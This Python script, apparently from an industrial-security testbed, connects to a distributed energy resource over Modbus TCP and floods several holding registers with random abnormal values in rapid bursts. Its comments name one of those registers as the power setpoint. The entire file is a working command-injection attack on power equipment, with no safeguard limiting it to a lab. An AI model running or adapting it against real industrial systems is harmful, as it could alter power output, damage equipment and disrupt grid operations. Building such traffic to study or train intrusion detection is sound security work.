# command_injection.py
from pymodbus.client import ModbusTcpClient
import time
import random
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--ip", default="192.168.1.205")
parser.add_argument("--port", type=int, default=502)
parser.add_argument("--bursts", type=int, default=30, help="number of bursts")
parser.add_argument("--burst_size", type=int, default=10, help="writes per burst")
parser.add_argument("--interval", type=float, default=2.0, help="seconds between bursts")
args = parser.parse_args()

DER_IP = args.ip
PORT = args.port

client = ModbusTcpClient(DER_IP, port=PORT)
if not client.connect():
    print("FAILED to connect to DER at", DER_IP)
    raise SystemExit

print("Connected to DER for injection:", DER_IP)

# normal register range you used before: (example) reg 2 used for power setpoint
# pick registers outside typical range or pattern to be "abnormal"
abnormal_regs = [2, 3, 4, 10, 20, 30]
for b in range(args.bursts):
    for i in range(args.burst_size):
        reg = random.choice(abnormal_regs)
        # pick abnormal values out of normal observed range (e.g. 800-2000)
        value = random.randint(800, 2000)
        client.write_register(address=reg, value=value, slave=1)
        # very bursty writes: small pause between writes in a burst
        time.sleep(0.02)
    print(f"sent burst {b+1}/{args.bursts} (size {args.burst_size})")
    time.sleep(args.interval)

client.close()
print("Command injection finished")
